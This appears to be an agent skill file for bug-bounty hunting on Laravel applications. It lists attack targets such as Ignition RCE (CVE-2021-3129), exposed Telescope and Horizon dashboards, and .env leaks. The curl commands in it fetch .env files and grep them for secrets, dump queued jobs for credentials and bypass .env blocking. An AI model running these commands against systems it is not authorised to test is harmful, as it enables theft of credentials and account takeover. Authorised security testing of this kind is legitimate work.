---
name: hunt-laravel
description: Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
sources: hackerone_public, cve_database
report_count: 14
---

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets
- **Ignition RCE (CVE-2021-3129)** — APP_DEBUG=true + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE
- **Telescope dashboard** — `/telescope` exposes request/response logs, DB queries, env vars
- **Horizon dashboard** — `/horizon` exposes queue payloads (API keys, PII)
- **Signed URL manipulation** — `URL::signedRoute` validation bypass
- **.env exposure** — APP_KEY leaked → decrypt cookies → ATO

## Phase 1 — Fingerprint
```bash
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
for path in /storage /public "/.env" "/artisan" /horizon /telescope; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done
```

## Phase 2 — Debug Mode & Ignition RCE
```bash
# Check debug mode
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# CVE-2021-3129 test
curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/_ignition/health-check"
```
If debug mode on + _ignition reachable → CVE-2021-3129 chain (ambionics/laravel-ignition-rce)

## Phase 3 — Env & Key Exposure
```bash
# .env file
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|MAIL_PASSWORD\|AWS_SECRET"

# Debug page env dump
curl -s "https://$TARGET/nonexistent" | grep -oE '[A-Z_]+=[A-Za-z0-9_]+'
```

## Phase 4 — Signed URL Manipulation
```bash
# If app has signed route (e.g., /verify-email/{id}/{hash}):
# Try manipulating the hash, id parameter, or expiry
curl -s "https://$TARGET/verify-email/1/invalidhash" | grep -i "invalid\|expired"
```

## Phase 5 — Queue Worker & Serialization
```bash
# If Laravel Horizon/Telescope exposed:
# 1. Dump failed jobs for credentials/tokens
# 2. Try deserialization via `unserialize()` in cookie value
curl -s -b "laravel_session=..." "https://$TARGET/horizon/failed"
```

## Bypass Techniques
| Defense | Bypass |
|---|---|
| Telescope auth middleware | Check `/telescope/telescope-api/` direct API |
| .env blocked by nginx | Try `/.env.backup`, `/.env.save`, `/.env.old` |
| APP_KEY rotated | Check older commits in public repo for old key |

## Chain Table
| Finding | Chain to | Impact |
|---------|----------|--------|
| APP_DEBUG=true + Ignition | CVE-2021-3129 RCE | Critical |
| APP_KEY leaked | Decrypt cookies → ATO | High |
| Telescope exposed | DB creds from logs | High |
| Horizon exposed | Queue payloads | High |
| .env file readable | All production secrets | Critical |

## Related Skills
- **hunt-rce** — CVE-2021-3129 full exploitation
- **hunt-nodejs** — if Laravel app also has Node.js frontend
- **triage-validation** — 7-Question Gate before submission
